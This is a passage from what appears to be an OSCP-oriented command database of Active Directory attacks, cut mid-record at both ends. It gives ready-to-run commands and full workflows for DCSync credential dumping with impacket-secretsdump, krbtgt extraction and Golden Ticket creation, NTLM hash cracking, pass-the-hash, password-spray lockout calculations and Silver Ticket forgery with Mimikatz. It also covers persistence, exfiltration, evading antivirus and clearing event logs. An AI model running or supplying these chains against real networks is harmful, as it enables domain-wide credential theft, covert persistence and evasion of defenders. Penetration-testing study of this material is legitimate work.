impacket-secretsdump -just-dc-user dave 'corp.com/admin:pass@192.168.50.70' | grep dave: | cut -d':' -f4

TIME ESTIMATE: 2-10 seconds (single user), 30-120 seconds (full domain dump with -just-dc)","high","","","","{""STATUS_LOGON_FAILURE"": ""Invalid credentials. Solution: Verify username and password: smbclient -L //<DC_IP> -U <DOMAIN>/<USER>. Check password for typos (passwords are case-sensitive). Verify account not locked: crackmapexec smb <DC_IP> -u <USER> -p <PASS> -d <DOMAIN>. Test with different domain format (NetBIOS vs FQDN)."", ""ERROR_DS_DRA_ACCESS_DENIED (0x2105)"": ""User lacks replication privileges. Solution: Verify Domain Admin membership: crackmapexec smb <DC_IP> -u <USER> -p <PASS> -d <DOMAIN> --groups. Alternative: Use known DA account. Check group membership: rpcclient -U '<DOMAIN>/<USER>%<PASS>' <DC_IP> -c 'enumdomgroups; querygroupmem 0x200' (0x200 = Domain Admins RID 512)."", ""Connection refused (port 445)"": ""SMB not reachable. Solution: Verify DC IP: ping <DC_IP>. Check firewall: sudo nmap -p 445,135,389 -Pn <DC_IP>. If only RDP available, use Mimikatz instead OR tunnel SMB through SSH: ssh -L 445:localhost:445 user@target. Verify not targeting workstation (must target DC)."", ""KRB_AP_ERR_SKEW (Kerberos time skew)"": ""Clock difference > 5 minutes between Kali and DC. Solution: Sync time: sudo ntpdate <DC_IP> OR sudo rdate -n <DC_IP>. Verify time: date && net time \\\\<DC_IP>. If ntpdate unavailable: sudo timedatectl set-time '<DC_TIME>'. Kerberos requires <5min time difference."", ""SMB SessionError: STATUS_ACCESS_DENIED (different from 0x2105)"": ""SMB signing or encryption issue. Solution: Try different SMB dialect: impacket-secretsdump -just-dc-user <USER> '<DOMAIN>/<USER>:<PASS>@<DC_IP>' -dc-ip <DC_IP>. Or use NetBIOS name instead of IP. Check SMB signing: crackmapexec smb <DC_IP> --gen-relay-list relay.txt"", ""Impacket command not found"": ""Impacket not installed. Solution: Install: sudo apt install impacket-scripts (Debian/Kali) OR pip3 install impacket (manual install). Verify: which impacket-secretsdump. If pip installed: use secretsdump.py instead of impacket-secretsdump (script name differs)."", ""Special characters in password break command"": ""Shell interpreting password chars. Solution: ALWAYS use single quotes around auth string: 'domain/user:P@ss!@<DC>'. If single quote in password, escape: 'domain/user:P@ss'\""'\""'word@DC'. Test password: smbclient -L //<DC> -U 'domain/user%password'""}","{""impacket-secretsdump"": ""Python-based tool from Impacket suite that dumps credentials from Windows systems. For DCSync, it uses DRSUAPI protocol to request password replication. Advantages: (1) Runs on Linux (no Windows AV), (2) Clean text output (easy parsing), (3) Multiple authentication methods (password, hash, Kerberos), (4) Actively maintained by Fortra/Core Security."", ""-just-dc-user <USERNAME>"": ""Extract ONLY the specified user account. Output includes NTLM hash, password history, and Kerberos keys (AES256, AES128). CRITICAL: Significantly reduces output volume and log noise compared to full dump. WHY: Single user extraction is faster, stealthier, and OSCP-appropriate (you rarely need all 10,000 domain accounts)."", ""Authentication string format"": ""'DOMAIN/USER:PASS@TARGET' - CRITICAL: Use SINGLE QUOTES to prevent shell interpretation of special characters (!,$,\\,etc.). The domain can be NetBIOS (corp) or FQDN (corp.com). For Kerberos auth, use FQDN. WHY QUOTES: Passwords with special chars like BrouhahaTungPerorateBroom2023! will break without quotes."", ""Optional: -target-ip <DC_IP>"": ""Explicitly specify DC IP for Kerberos authentication when using FQDN. Example: -just-dc-user krbtgt -target-ip 192.168.50.70 'corp.com/admin:pass@DC1.corp.com'. WHY: Kerberos requires FQDNs but DNS may not resolve - this allows FQDN for Kerberos with manual IP routing."", ""Optional: -hashes :<NTLM_HASH>"": ""Authenticate using NTLM hash (Pass-the-Hash) instead of password. Colon prefix required (:-hashes :NTLM). Example: impacket-secretsdump -hashes :8846f7eaee8fb117ad06bdd830b7586c -just-dc-user krbtgt 'corp.com/admin@192.168.50.70'. WHY: You may have obtained DA hash via other means (SMB relay, responder) but not plaintext password."", ""Optional: -k (Kerberos auth)"": ""Use Kerberos authentication instead of NTLM. Requires valid TGT in KRB5CCNAME env variable. Stealthier than NTLM but complex setup. Example: export KRB5CCNAME=admin.ccache && impacket-secretsdump -k -just-dc-user krbtgt 'corp.com/admin@DC1.corp.com'""}","[""ad-dcsync-check-domain-admins""]","[""ad-dcsync-mimikatz-user"", ""ad-dcsync-secretsdump-all""]","[""windows-hashcat-crack-ntlm"", ""ad-pass-the-hash-impacket-psexec"", ""ad-golden-ticket-mimikatz-create""]"
"ad-dcsync-secretsdump-krbtgt","DCSync krbtgt with Impacket (Golden Ticket)","post-exploit","impacket-secretsdump -just-dc-user krbtgt '<DOMAIN>/<DA_USER>:<PASSWORD>@<DC_IP>'","Extract krbtgt account hash for Golden Ticket creation. CRITICAL first step after achieving Domain Admin access. The krbtgt hash enables persistent domain-wide access via forged TGTs.","active-directory","impacket-secretsdump -just-dc-user krbtgt 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70'","ALWAYS the FIRST target after achieving Domain Admin. OSCP EXAM WORKFLOW: (1) Get DA, (2) DCSync krbtgt, (3) Save hash externally, (4) Get Domain SID (lookupsid.py or rpcclient), (5) Create Golden Ticket with ticketer.py or Mimikatz. The output line you need: 'krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<32_HEX_CHARS>:::' - copy the 32 hex characters after the third colon. Time estimate: 2-10 seconds.

MANUAL ALTERNATIVES:
With Pass-the-Hash:
impacket-secretsdump -hashes :<DA_NTLM_HASH> -just-dc-user krbtgt '<DOMAIN>/<DA_USER>@<DC_IP>'

Extract krbtgt + get Domain SID in one command:
impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70' && \
rpcclient -U 'corp.com/admin%pass' 192.168.50.70 -c 'lsaquery'

Parse NTLM hash only (for ticketer.py):
krbtgt_hash=$(impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70' | grep krbtgt | cut -d':' -f4)
echo ""krbtgt NTLM hash: $krbtgt_hash""

Extract both NTLM and AES256:
impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70' > krbtgt_full.txt
grep aes256 krbtgt_full.txt

Golden Ticket workflow (complete chain):
# 1. Get krbtgt hash
impacket-secretsdump -just-dc-user krbtgt 'corp.com/admin:pass@192.168.50.70'
# 2. Get Domain SID
lookupsid.py 'corp.com/admin:pass@192.168.50.70' | grep ""Domain SID""
# 3. Create Golden Ticket
ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain corp.com Administrator
# 4. Use ticket
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass corp.com/Administrator@DC1.corp.com

TIME ESTIMATE: 2-10 seconds (extraction only), 1-2 minutes (full Golden Ticket workflow)","high","","","","{""Same as ad-dcsync-secretsdump-user"": ""Refer to troubleshooting section in ad-dcsync-secretsdump-user. krbtgt extraction has identical requirements and failure modes."", ""Empty output but no error"": ""User may exist but krbtgt filtered. Solution: Try without -just-dc-user to dump all, then grep for krbtgt: impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<DC_IP>' -just-dc | grep krbtgt""}","{""-just-dc-user krbtgt"": ""Extracts ONLY the krbtgt account (RID 502). Output includes NTLM hash (for RC4 Golden Ticket) and AES256/AES128 keys (for AES Golden Ticket - more stealthy). The krbtgt account is the Kerberos Ticket Granting Ticket service account - its hash is used to encrypt all TGTs issued by the domain. CRITICAL: Save this hash securely - it's your persistent backdoor into the domain."", ""Why krbtgt first"": ""With krbtgt hash, you can create Golden Tickets granting Domain Admin rights to ANY user, even after defenders change all passwords. The krbtgt password rarely changes (only during DC promotions or manual rotation). This provides long-term persistence independent of other account credentials.""}","[""ad-dcsync-check-domain-admins""]","[""ad-dcsync-mimikatz-krbtgt""]","[""ad-sid-whoami-extract"", ""ad-golden-ticket-mimikatz-create"", ""ad-golden-ticket-rubeus-create""]"
"ad-dcsync-secretsdump-all","DCSync All Domain Hashes (Full Dump)","post-exploit","impacket-secretsdump -just-dc '<DOMAIN>/<DA_USER>:<PASSWORD>@<DC_IP>'","Extract ALL domain user password hashes via DCSync. Equivalent to dumping NTDS.dit but remote and cleaner. Use sparingly - generates significant DC logs and traffic.","active-directory","impacket-secretsdump -just-dc 'corp.com/jeffadmin:BrouhahaTungPerorateBroom2023!@192.168.50.70'","RARELY needed in OSCP - usually target specific users (krbtgt, Administrator) instead. Full dumps useful for: (1) Real penetration tests (password security analysis), (2) CTF/lab environments (find hidden admin accounts), (3) Offline analysis (correlate credentials, find password patterns). OSCP TIP: Prefer -just-dc-user for exam - faster, quieter, more targeted. Full dumps can take 30+ seconds on small domains, 15+ minutes on large domains. Time estimate: 30 seconds - 15 minutes (domain size dependent).

MANUAL ALTERNATIVES:
Save to file for analysis:
impacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' -outputfile corp_hashes
# Creates: corp_hashes.ntds (hashes), corp_hashes.secrets (LSA secrets), corp_hashes.cached (cached creds)

Faster dump (NTLM only, no Kerberos keys):
impacket-secretsdump -just-dc-ntlm 'corp.com/admin:pass@192.168.50.70'

Filter enabled users only:
impacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' | grep -v ""ACCOUNTDISABLE""

Extract specific user types:
# Administrators only (RID 500-520)
impacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' | grep "":50[0-9]:""
# Computer accounts
impacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' | grep ""\$:""
# Service accounts (common naming)
impacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' | grep -i ""svc\|service\|sql\|backup""

Hashcat workflow:
impacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' > all_hashes.txt
cut -d':' -f4 all_hashes.txt > ntlm_hashes.txt
hashcat -m 1000 ntlm_hashes.txt rockyou.txt -r best64.rule --force

TIME ESTIMATE: 30 seconds (small domain <100 users), 2-5 minutes (medium <1000 users), 10-30 minutes (large 5000+ users)","medium","","","","{""Command hangs / timeout"": ""Large domain (10,000+ users) taking time. Solution: Be patient (can take 5-15 minutes for large domains). Alternatively, target specific high-value users with -just-dc-user instead. Monitor progress: impacket-secretsdump -just-dc 'domain/user:pass@dc' -debug (shows each user being processed). Kill and retry with -just-dc-ntlm for faster dump (skips Kerberos keys)."", ""Partial output then error"": ""Network interruption or DC timeout. Solution: Save output immediately: impacket-secretsdump -just-dc 'domain/user:pass@dc' > hashes.txt. Retry dump and compare: diff hashes.txt hashes2.txt. If repeatedly failing, target users individually with -just-dc-user."", ""Too much output"": ""Expected for full dumps. Solution: Redirect to file: impacket-secretsdump -just-dc 'corp.com/admin:pass@192.168.50.70' > all_hashes.txt. Parse specific users: grep -i administrator all_hashes.txt. Extract only NTLM column: cut -d':' -f4 all_hashes.txt > ntlm_only.txt. Feed to Hashcat: hashcat -m 1000 ntlm_only.txt rockyou.txt""}","{""-just-dc"": ""Dump ALL domain credentials using DRSUAPI (DCSync method). Extracts NTLM hashes for every user account, computer account, and service account in the domain. Output can be 1000s of lines in large domains. CRITICAL: This is NOISY - generates Event ID 4662 for EVERY account replicated. WHY NOT -just-dc-user: Full dump useful for offline password analysis (find weak passwords across domain), credential correlation (same password reuse), and computer account analysis."", ""Output format"": ""Each line: username:uid:lmhash:nthash::: - Ready for Hashcat mode 1000. Computer accounts end with $ (e.g., CLIENT75$). Service accounts may have SPNs (useful for Kerberoasting correlation). Built-in accounts (krbtgt, Administrator) appear first."", ""Difference from -just-dc-ntlm"": ""-just-dc dumps NTDS.dit secrets via DRSUAPI (DCSync). Alternative flags: -just-dc-user (single user), -just-dc-ntlm (hashes only, no Kerberos keys), -pwd-last-set (include password age). For OSCP, -just-dc or -just-dc-user are most relevant.""}","[""ad-dcsync-check-domain-admins""]","[""ad-dcsync-secretsdump-user""]","[""windows-hashcat-crack-ntlm-file""]"
"net-accounts-policy","Net Accounts - Domain Password Policy","enumeration","net accounts","Display Active Directory password policy from domain-joined Windows system (lockout threshold, lockout duration, observation window)","active-directory","","CRITICAL for password spraying attacks.

Lockout threshold indicates max failed logins before account lockout.

Lockout observation window shows time until counter resets.

CALCULATION:
With 5 attempts threshold and 30min window, you can safely attempt 4 logins per user every 30 minutes = 192 attempts per user per 24 hours.

TIME ESTIMATE:
<5 seconds.

MANUAL ALTERNATIVE:
Check Group Policy (gpedit.msc  Computer Configuration  Windows Settings  Security Settings  Account Policies  Account Lockout Policy) or query LDAP for lockoutThreshold attribute.

OSCP TIP:
Always run this FIRST before any password attacks to avoid locking out accounts and alerting administrators.","high","","","","{""Access is denied"": ""Ensure you are logged in as a domain user on a domain-joined Windows system. Use RDP or WinRM with valid credentials."", ""System error 1355"": ""Not executed from a domain-joined system. Use enum4linux-policy or crackmapexec-policy from Linux instead.""}","","","[""enum4linux-policy"", ""crackmapexec-policy"", ""ldapsearch-policy""]","[""kerbrute-userenum"", ""spray-passwords-ldap"", ""crackmapexec-smb-spray"", ""kerbrute-passwordspray""]"
"enum4linux-policy","Enum4linux - Password Policy via SMB","enumeration","enum4linux -P <TARGET>","Enumerate Active Directory password policy from Linux via SMB (supports null sessions or authenticated)","active-directory","enum4linux -P 192.168.50.70","STEALTHY method for external password policy discovery.

Often works via NULL SESSION (no credentials required) if SMB null sessions are enabled on DC.

NOISE LEVEL:
Medium (SMB connection logged).

TIME ESTIMATE:
10-30 seconds.

MANUAL ALTERNATIVE:
Use rpcclient with -N flag for null session:
rpcclient -N -U '' <TARGET> then 'getdompwinfo'.

WHY THIS WORKS:
Windows DCs expose password policy via MS-SAMR RPC interface accessible over SMB.

Null sessions may be allowed for backward compatibility.

OSCP TIP:
Try null session first, then authenticated if blocked.

Modern domains often block null sessions.","high","","","","{""NT_STATUS_ACCESS_DENIED"": ""Null session blocked. Try with credentials: enum4linux -u <USER> -p <PASS> -P <TARGET>"", ""Connection refused"": ""SMB ports (445/139) may be filtered. Verify connectivity: sudo nmap -p 139,445 -Pn -v <TARGET>"", ""Protocol negotiation failed"": ""SMBv1 may be disabled. Use crackmapexec-policy instead (supports SMBv2/v3)""}","{""-P"": ""Get password policy information via SMB"", ""-u"": ""Specify username for authenticated enumeration (optional, use with -p)"", ""-p"": ""Specify password for authenticated enumeration (optional, use with -u)"", ""-a"": ""Do all simple enumeration (includes -P plus users, shares, groups)""}","","[""net-accounts-policy"", ""crackmapexec-policy"", ""ldapsearch-policy""]","[""enum4linux-users-ad"", ""kerbrute-userenum"", ""crackmapexec-smb-spray""]"
"crackmapexec-policy","CrackMapExec - Password Policy Enumeration","enumeration","crackmapexec smb <TARGET> -u <USERNAME> -p <PASSWORD> --pass-pol","Enumerate Active Directory password policy via SMB using CrackMapExec (supports SMBv2/v3, requires credentials)","active-directory","crackmapexec smb 192.168.50.70 -u guest -p '' --pass-pol","MODERN alternative to enum4linux with SMBv2/v3 support.

REQUIRES valid domain credentials (guest account often works with blank password).

ADVANTAGE:
Works when SMBv1/null sessions disabled.

NOISE LEVEL:
Medium (authenticated SMB connection logged).

TIME ESTIMATE:
5-15 seconds.

WHY THIS WORKS:
CrackMapExec uses MS-SAMR RPC over SMB to query password policy from domain controller.

Any authenticated domain user can read password policy (not privileged information).

OSCP TIP:
If you have ANY valid domain credentials, use this instead of enum4linux.

Try guest:'' first.

Guest account is often enabled with blank password even when null sessions are blocked.","high","","","","{""STATUS_LOGON_FAILURE"": ""Invalid credentials. Try guest account with blank password: crackmapexec smb <TARGET> -u 'guest' -p ''"", ""Connection refused"": ""SMB port 445 blocked. Check firewall: sudo nmap -p 445 -Pn -v <TARGET>"", ""STATUS_ACCESS_DENIED"": ""User lacks permissions. Any valid domain user should work - verify credentials are correct.""}","{""--pass-pol"": ""Dump password policy information"", ""-u"": ""Username (single user or file with -U)"", ""-p"": ""Password (single password or file with -P)"", ""-d"": ""Domain name (optional, auto-detected from DC)"", ""--local-auth"": ""Authenticate to local SAM instead of domain (not useful for domain policy)""}","","[""net-accounts-policy"", ""enum4linux-policy"", ""ldapsearch-policy""]","[""crackmapexec-smb-spray"", ""kerbrute-userenum""]"
"ldapsearch-policy","ldapsearch - LDAP Password Policy Query","enumeration","ldapsearch -x -H ldap://<TARGET> -b '<DOMAIN_DN>' -s base '(objectClass=*)' lockoutThreshold lockoutDuration lockOutObservationWindow minPwdLength pwdProperties","Query Active Directory password policy directly via LDAP (anonymous or authenticated)","active-directory","ldapsearch -x -H ldap://192.168.50.70 -b 'DC=corp,DC=com' -s base '(objectClass=*)' lockoutThreshold lockoutDuration lockOutObservationWindow minPwdLength pwdProperties","MOST DIRECT method - queries password policy attributes directly from AD LDAP.

May work ANONYMOUSLY if anonymous LDAP binding is enabled (uncommon in modern domains).

NOISE LEVEL:
Low (LDAP query, often not logged).

TIME ESTIMATE:
5-10 seconds.

TIME CONVERSION:
lockoutDuration and lockOutObservationWindow are in 100-nanosecond intervals (e.g., 18000000000 = 30 minutes).

Divide by 600000000 to get minutes.

MANUAL ALTERNATIVE:
Use AD Explorer (Windows GUI) or PowerShell Get-ADDefaultDomainPasswordPolicy.

WHY THIS WORKS:
Password policy stored in domain root object in AD, readable by any authenticated user (sometimes anonymous).

OSCP TIP:
Less common than SMB-based enumeration but useful when SMB is blocked or filtered.

Domain DN format:
DC=domain,DC=com (replace dots with ',DC=').

For corp.com use DC=corp,DC=com.","medium","","","","{""Can't contact LDAP server"": ""LDAP port 389 may be blocked. Verify: sudo nmap -p 389,636 -Pn -v <TARGET>. Try LDAPS (port 636) with ldaps:// instead of ldap://"", ""Invalid credentials"": ""Anonymous bind blocked. Use credentials: ldapsearch -x -H ldap://<TARGET> -D '<USER>@<DOMAIN>' -w '<PASSWORD>' -b '<DOMAIN_DN>' ..."", ""Operations error"": ""Anonymous queries may be disabled. Retry with valid credentials."", ""Need to convert times"": ""lockoutDuration and lockOutObservationWindow are in 100-nanosecond intervals. Divide by 600000000 to get minutes.""}","{""-x"": ""Use simple authentication (no SASL)"", ""-H"": ""LDAP URI (ldap:// or ldaps://)"", ""-b"": ""Base DN for search"", ""-s base"": ""Search scope (base = single object)"", ""-D"": ""Bind DN for authenticated queries (optional, use with -w)"", ""-w"": ""Password for authenticated bind (optional, use with -D)"", ""'(objectClass=*)'"": ""LDAP filter (match all)"", ""lockoutThreshold"": ""Attribute: failed login attempts before lockout"", ""lockoutDuration"": ""Attribute: lockout duration in 100-nanosecond intervals"", ""lockOutObservationWindow"": ""Attribute: time window for counting failed attempts"", ""minPwdLength"": ""Attribute: minimum password length"", ""pwdProperties"": ""Attribute: password complexity flags""}","","[""net-accounts-policy"", ""enum4linux-policy"", ""crackmapexec-policy""]","[""ldapsearch-users-ad"", ""kerbrute-userenum"", ""crackmapexec-smb-spray""]"
"ad-silver-ticket-mimikatz-create","Create Silver Ticket with Mimikatz","active-directory","mimikatz # kerberos::golden /domain:<DOMAIN_FQDN> /sid:<DOMAIN_SID> /target:<TARGET_SERVER_FQDN> /service:<SPN_SERVICE> /rc4:<SERVICE_ACCOUNT_NTLM> /user:<IMPERSONATED_USER> /ptt","Forge a Kerberos service ticket (TGS) for a specific SPN using the service account's NTLM hash. The forged ticket grants access to that service with arbitrary user identity and permissions.","kerberos-attacks","mimikatz # kerberos::golden /domain:<corp.com> /sid:<S-1-5-21-1987370270-658905905-1781884369> /target:<web04.corp.com> /service:<http> /rc4:<4d28cf5252d39971419580a51484ca09> /user:<jeffadmin> /ptt","OSCP METHODOLOGY - WHEN TO USE SILVER TICKETS:
Silver tickets are LATERAL MOVEMENT and PERSISTENCE techniques that work when you have:
1.

Service account NTLM hash (from Kerberoasting, LSASS dump, or DCSync)
2.

Cannot use the hash directly with Pass-the-Hash (service doesn't support NTLM auth, only Kerberos)
3.

Need access to specific service without full domain compromise
4.

Want stealthier persistence than Golden Ticket (service-level, not domain-level)

SILVER VS OTHER TECHNIQUES:
SILVER TICKET vs PASS-THE-HASH:
- Use PTH:
When service supports NTLM authentication (SMB, WMI, WinRM with CredSSP)
- Use Silver:
When service only accepts Kerberos (IIS with Kerberos-only, SQL Server with integrated auth, modern hardened services)
- Advantage of Silver:
Works against Kerberos-only services, persists in ticket cache for 10 years (default)
- Advantage of PTH:
Simpler (just use hash directly), no ticket forging needed

SILVER TICKET vs GOLDEN TICKET:
- Use Golden:
When you have krbtgt hash (full domain compromise), need domain-wide access, want to impersonate any user to any service
- Use Silver:
When you only have service account hash (partial compromise), need access to ONE specific service, want lower detection risk
- Advantage of Silver:
Stealthier (no DC interaction, service-level only), faster to create (no krbtgt needed)
- Advantage of Golden:
Domain-wide access, works for all services, bypasses most Kerberos security checks
- Detection difference:
Golden tickets generate Event ID 4768 (TGT request) anomalies on DC, Silver tickets only generate Event ID 4769 (TGS usage) on service machine

SILVER TICKET vs KERBEROASTING (continued attack chain):
- Kerberoasting:
Obtain TGS-REP encrypted with service account hash
- Crack TGS-REP:
Get plaintext password or NTLM hash
- Silver Ticket:
Use obtained hash to forge tickets for that service
- This is the TYPICAL OSCP EXAM FLOW:
Kerberoast  Crack  Silver Ticket  Service Access

MANUAL ALTERNATIVES (if Mimikatz unavailable):
Rubeus (recommended alternative):
Rubeus.exe silver /domain:<domain> /sid:<domain_sid> /target:<target> /service:<service> /rc4:<ntlm_hash> /user:<user> /ptt
- Advantages:
Actively maintained, better OPSEC, cleaner output, supports AES encryption
- Same functionality as Mimikatz kerberos::golden but modern codebase

impacket-ticketer (Linux-based):
python3 ticketer.py -nthash <ntlm_hash> -domain-sid <domain_sid> -domain <domain> -spn <service>/<target> <username>
- Generates .ccache file (Kerberos credential cache)
- Use with:
export KRB5CCNAME=<username>.ccache, then access service with impacket tools
- LIMITATION:
Can't directly inject into Windows session, must use .ccache with Linux Kerberos tools

COMMON SPN SERVICE TYPES FOR OSCP:
1.

cifs (File Shares, SMB):
Most common lateral movement target
   - Access:
dir \\<server>\C$, copy files, PsExec, remote admin
   - Obtain hash:
Kerberoast user accounts with SPN cifs/<hostname>, or dump LSASS on fileserver
   - OSCP scenario:
Pivot to fileserver, exfiltrate data, plant backdoors

2.

http (IIS, Web Apps):
Common for web-based exploitation
   - Access:
Invoke-WebRequest http://<server>, upload webshell, access admin panels
   - Obtain hash:
Kerberoast IIS service accounts (often named iis_service, websvc, apppooluser)
   - OSCP scenario:
Access restricted web admin interface, upload reverse shell, exploit web vulns

3.

mssql (SQL Server):
Database access and code execution
   - Access:
Invoke-Sqlcmd, xp_cmdshell for RCE, database enumeration
   - Obtain hash:
Kerberoast SQL service accounts (often high-privilege)
   - OSCP scenario:
Enable xp_cmdshell, execute OS commands, escalate to SYSTEM via SQL Agent

4.

ldap (Domain Controllers):
Advanced AD attacks
   - Access:
LDAP queries, directory modifications, DCSync (if permissions exist)
   - Obtain hash:
Compromise DC, dump LSASS, DCSync domain controller computer account
   - OSCP scenario:
Rare for Silver (use Golden instead), but useful for specific LDAP-based exploits

5.

host (Generic Host Services):
Catch-all for multiple services
   - Access:
Multiple protocols (RPC, WMI, scheduled tasks, services)
   - Obtain hash:
Kerberoast computer accounts (machine accounts often have host SPN)
   - OSCP scenario:
Remote service creation, scheduled task execution, WMI code execution

TIME ESTIMATES FOR OSCP EXAM:
- Prerequisite gathering (Domain SID, SPN enumeration):
2-3 minutes
- Service account hash acquisition:
  - Via Kerberoasting (if not done):
5-10 minutes (request TGS, crack with Hashcat)
  - Via LSASS dump (if service account logged on):
2 minutes (Mimikatz sekurlsa::logonpasswords)
  - Via DCSync (if DA already):
1 minute (lsadump::dcsync)
- Silver ticket creation:
<1 minute (Mimikatz command)
- Validation and service access:
1-2 minutes (klist, test access)
- TOTAL:
10-20 minutes end-to-end (assumes hash not yet obtained)

If hash already obtained (e.g., from earlier Kerberoasting):
5 minutes total

DETECTION AND OPSEC:
EVENT IDS GENERATED:
- Mimikatz execution:
Event ID 4688 (Process Creation), AMSI alerts if not obfuscated
- Ticket injection:
Event ID 4768 (TGT Request) - NOT generated (Silver tickets skip TGT step)
- Service access:
Event ID 4769 (TGS Request) - Generated on SERVICE machine, not DC
- Logon event:
Event ID 4624 (Logon Type 3 - Network) on target service machine

DETECTION INDICATORS (Blue Team Perspective):
- Service ticket (TGS) with 10-year lifetime (legitimate tickets expire in hours)
- Service ticket not issued by DC (no corresponding Event ID 4769 on DC)
- Encryption downgrade (RC4 instead of AES256) - modern environments prefer AES
- Account logon from unusual source IP
- Account accessing service it never accessed before (behavioral anomaly)

OPSEC IMPROVEMENTS:
1.

Use /aes256 instead of /rc4 (requires AES key, not NTLM hash):
Mimikatz /aes256:<hex_key>
2.

Set realistic ticket lifetime:
/endin:8 (expires in 8 hours) /renewmax:24 (renewable for 24 hours)
3.

Impersonate real user (/user:<real_username>) instead of fictional admin
4.

Use Rubeus instead of Mimikatz (better evasion, active development)
5.

Clear ticket cache after use:
klist purge

REALITY CHECK FOR OSCP EXAM:
 LIKELY SCENARIOS:
- Kerberoast service account  Crack hash  Silver ticket for lateral movement
- Dump LSASS on compromised machine  Find service account hash  Silver ticket to pivot
- Obtain domain admin  DCSync service accounts  Silver tickets for persistence

 UNLIKELY SCENARIOS:
- PAC validation enabled (rare in OSCP lab, common in modern enterprise)
- Service account password rotation mid-exam (exam environments are static)
- AES-only Kerberos (OSCP still allows RC4 for compatibility)

COMMON MISTAKES TO AVOID:
1.

Including user RID in Domain SID  Extract Domain SID correctly (remove last segment from whoami /user)
2.

Using NetBIOS name instead of FQDN  Always use FQDN for /domain and /target
3.

Wrong service type  Verify SPN with setspn -Q before forging ticket
4.

Using NTLM hash of WRONG account  Hash must be from service account that runs the SPN, not random domain user
5.

Assuming ticket works domain-wide  Silver tickets are SERVICE-SPECIFIC (cifs ticket won't work for http)

NEXT STEPS AFTER SILVER TICKET:
1.

Access the service:
dir \\<target>\C$ (cifs), iwr http://<target> (http), Invoke-Sqlcmd (mssql)
2.

Establish persistence:
Upload webshell, create scheduled task, add registry run key
3.

Pivot deeper:
Use service access to compromise additional accounts, escalate privileges
4.

Exfiltrate data:
Copy sensitive files, dump databases, enumerate shares
5.

Cover tracks:
klist purge (remove ticket from cache), clear event logs (if OPSEC matters)

PERSISTENCE USE CASE:
Silver tickets excel at PERSISTENCE because:
- Valid for 10 years (default) - Long-term access
- No password change detection - Even if service account password changes, cached ticket still works until service restarts (Windows doesn't re-validate cached tickets)
- No DC communication - Ticket works offline, survives DC reboots
- Service-level only - Harder to detect than domain-wide Golden ticket

PERSISTENCE WORKFLOW:
1.

Obtain service account hash during initial compromise
2.

Forge Silver ticket, save to .kirbi file (omit /ptt)
3.

Exfiltrate .kirbi file off target network
4.

Return weeks/months later, inject ticket:
kerberos::ptt <ticket.kirbi>
5.

Access service transparently

LIMITATION:
Ticket becomes invalid if:
- Service account is deleted (rare)
- Service account password changes AND service process restarts (clears cached encryption keys)
- Kerberos policy enforces ticket lifetime limits (Group Policy override, uncommon)

FINAL OSCP EXAM TIPS:
1.

Practice ticket creation 10+ times before exam (muscle memory for syntax)
2.

Keep Domain SID in notes (you'll use it multiple times)
3.

Enumerate all SPNs early (setspn -T <domain> -Q */*), prioritize high-value services (SQL, IIS, file shares)
4.

Crack Kerberoast hashes DURING enumeration phase (run Hashcat in background while doing other tasks)
5.

If Mimikatz blocked by AV, use Rubeus (often bypasses signature-based detection)
6.

Test ticket with klist BEFORE attempting service access (saves time troubleshooting)
7.

Document which tickets you've created (easy to lose track with multiple targets)

REFERENCES AND FURTHER LEARNING:
- Mimikatz Kerberos module:
https://github.com/gentilkiwi/mimikatz/wiki/module~kerberos
- Rubeus Silver Ticket:
https://github.com/GhostPack/Rubeus#silver
- Sean Metcalf's Silver Ticket research:
https://adsecurity.org/?p=2011
- Kerberos RFC 4120:
https://www.rfc-editor.org/rfc/rfc4120 (protocol specification)
- MITRE ATT&CK T1558.002:
https://attack.mitre.org/techniques/T1558/002/ (Silver Ticket technique)

This technique is a cornerstone of OSCP Active Directory exploitation.

Master it thoroughly.","high","","","","{""Forged ticket visible in klist but access still denied"": ""DIAGNOSIS: Wrong service type. The /service parameter must match the resource you're accessing. SOLUTION: Verify SPN with 'setspn -Q */<hostname>*'. Common fix: Change /service from 'http' to 'cifs' for file shares, or 'cifs' to 'http' for web apps. VALIDATION: List all SPNs on target with 'setspn -L <target_server>' (if you have access) or enumerate from DC with PowerView: Get-NetUser -SPN | Where {$_.serviceprincipalname -match '<hostname>'}."", ""KRB_AP_ERR_MODIFIED error when using ticket"": ""DIAGNOSIS: Ticket decryption failed on service side. Two main causes:\n1. Wrong NTLM hash - Service encrypted its ticket copy with a different password hash than you used to forge the ticket. SOLUTION: Re-obtain service account hash. Verify it's current (password may have changed). Test hash validity with CME: crackmapexec smb <dc_ip> -u <service_account> -H <ntlm_hash>.\n2. Wrong Domain SID - Included user RID by mistake. SOLUTION: Re-extract Domain SID with 'whoami /user', remove ONLY the last segment (RID). Example: S-1-5-21-123-456-789-1105 \u2192 Domain SID is S-1-5-21-123-456-789 (remove -1105).\n\nVALIDATION: Run Mimikatz in debug mode to see detailed error. Check Event ID 4769 on service machine for failure reason."", ""Hostname mismatch / SPN not found errors"": ""DIAGNOSIS: /target value doesn't match how the SPN is registered in AD. SOLUTION:\n1. Get exact SPN registration: setspn -Q */<hostname_or_partial>* from any domain-joined machine\n2. Extract hostname: SPN format is 'service/hostname.domain.com:port'. Use the full hostname portion.\n3. Verify FQDN: ping <hostname> to see if it resolves to FQDN. Use the FQDN in /target.\n4. Check SPN case: Kerberos is case-insensitive but use exact case from setspn output to avoid issues.\n\nEXAMPLE: If setspn shows 'HTTP/web04.corp.com', use /target:web04.corp.com /service:http (NOT http://web04 or WEB04)."", ""Need to use ticket on different machine"": ""SOLUTION: Don't use /ptt flag. Mimikatz will save ticket to .kirbi file (e.g., jeffadmin@http-web04.corp.com.kirbi). Transfer this file to target machine via 